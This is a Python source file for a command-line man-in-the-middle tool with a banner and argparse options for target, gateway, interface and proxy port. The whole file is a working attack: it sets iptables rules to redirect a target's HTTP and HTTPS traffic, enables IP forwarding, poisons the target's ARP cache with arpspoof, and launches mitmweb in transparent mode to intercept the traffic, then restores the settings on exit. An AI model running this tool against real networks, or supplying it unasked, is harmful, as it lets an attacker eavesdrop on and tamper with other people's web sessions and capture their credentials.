import os
import sys
import subprocess
import signal
import time
import argparse


class Colors:
    """Class for ANSI color codes."""
    GREEN = "\033[92m"
    CYAN = "\033[96m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"


class Mitm:
    def __init__(self, target="192.168.1.15", gateway="192.168.1.1", port="8080", interface="wlan0"):
        self.target = target
        self.gateway = gateway
        self.port = port
        self.interface = interface
        self.spoof_pid = None

    def run_command_bg(self, command):
        """Run a command in the background."""
        comm = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        return comm.pid

    def print_message(self, message, color=Colors.RESET, symbol="[*]"):
        """Helper method to print colored messages."""
        sys.stdout.write(f"{color}{symbol} {message}{Colors.RESET}")
        sys.stdout.flush()
        time.sleep(1)

    def check_arpspoof(self):
        """Check if arpspoof is working correctly."""
        self.print_message(f"Checking if ARP spoofing is successful for target {self.target} ", Colors.CYAN)
        output = subprocess.getoutput(f"arp -n {self.target}")
        if "incomplete" in output:
            print(f"{Colors.RED}FAILED{Colors.RESET}")
            print(output)
            # self.restore_config()
            return False
        else:
            print(f"{Colors.GREEN}OK{Colors.RESET}")
            return True

    def config(self):
        """Configure the system for MITM attack."""
        self.print_message("Setting iptables ", Colors.CYAN)
        os.system(f"iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 443 -j REDIRECT --to-port {self.port}")
        os.system(f"iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 80 -j REDIRECT --to-port {self.port}")
        # os.system("iptables -t nat -L -n -v")
        print(f"{Colors.GREEN}OK{Colors.RESET}")
        # os.system("arp -a")

        self.print_message("Enable IP forwarding ", Colors.CYAN)
        ipforward = subprocess.getoutput("sysctl -w net.ipv4.ip_forward=1")
        print(f"{Colors.GREEN}OK{Colors.RESET}")

        self.print_message("Run arpspoof ", Colors.CYAN)
        self.spoof_pid = self.run_command_bg(f"arpspoof -i {self.interface} -t {self.target} {self.gateway}")
        print(f"{Colors.GREEN}PID: {self.spoof_pid}{Colors.RESET}")

        self.print_message("Waiting 10 seconds\n", Colors.CYAN)
        time.sleep(10)
        return self.check_arpspoof()

    def restore_config(self):
        """Restore system configuration."""
        self.print_message("Restoring iptables ", Colors.YELLOW)
        os.system("iptables -t nat -F")
        # os.system("iptables -t nat -L -n -v")
        print(f"{Colors.GREEN}OK{Colors.RESET}")

        self.print_message("Disable ip forward ", Colors.YELLOW)
        ipforward = subprocess.getoutput("sysctl -w net.ipv4.ip_forward=0")
        print(f"{Colors.GREEN}OK{Colors.RESET}")

        self.print_message("Disable arpspoofing ", Colors.YELLOW)
        if self.spoof_pid:
            try:
                os.killpg(os.getpgid(self.spoof_pid), signal.SIGTERM)
                print(f"{Colors.GREEN}OK{Colors.RESET}")
            except ProcessLookupError:
                print(f"{Colors.RED}FAILED, Process not found{Colors.RESET}")
            except PermissionError:
                print(f"{Colors.RED}FAILED, Permission error{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}FAILED, {e}{Colors.RESET}")

    def require_root(self):
        """Ensure the script is run with root privileges."""
        if os.geteuid() != 0:
            self.print_message("Please run this script as root.\n", Colors.RED, "[!]")
            sys.exit(1)

    def run_mitm(self):
        """Start mitmproxy."""
        self.print_message("Starting mitmproxy\n", Colors.CYAN)
        os.system(f"mitmweb --mode transparent --ssl-insecure --listen-port {self.port}")


if __name__ == "__main__":
    reset_counter = subprocess.getoutput("sudo iptables -Z -t nat")
    flush_arp = subprocess.getoutput("ip -s -s neigh flush all")
    banner = r"""
 ___ ___ ____ ______ ___ ___ 
|   |   |    |      |   |   |
| _   _ ||  ||      | _   _ |
|  \_/  ||  ||_|  |_|  \_/  |
|   |   ||  |  |  | |   |   |
|   |   ||  |  |  | |   |   |
|___|___|____| |__| |___|___|                         
Version: 1.0
"""
    print(banner)
    parser = argparse.ArgumentParser(description="MITM Tool")
    parser.add_argument("--target", help="Target IP or hostname for the MITM attack", required=True)
    parser.add_argument("--gateway", help="Specify the gateway IP address", default="192.168.1.1")
    parser.add_argument("--interface", help="Network interface to use", default="wlan0")
    parser.add_argument("--port", help="Port for mitm proxy", default="8080")
    args = parser.parse_args()

    app = Mitm(target=args.target,gateway=args.gateway,port=args.port,interface=args.interface)
    app.require_root()

    print(f"{Colors.GREEN}Target:{Colors.RESET} {args.target}")
    print(f"{Colors.GREEN}Gateway:{Colors.RESET} {args.gateway}")
    print(f"{Colors.GREEN}Proxy Port:{Colors.RESET} {args.port}")
    print(f"{Colors.GREEN}Interface:{Colors.RESET} {args.interface}\n")

    try:
        config = app.config()
        if config:
            app.run_mitm()
    except KeyboardInterrupt:
        app.print_message("Keyboard interrupt detected. Restoring configuration.\n", Colors.RED, "[!]")
        app.restore_config()
    finally:
        app.restore_config()
    reset_counter = subprocess.getoutput("sudo iptables -Z -t nat")
    flush_arp = subprocess.getoutput("ip -s -s neigh flush all")
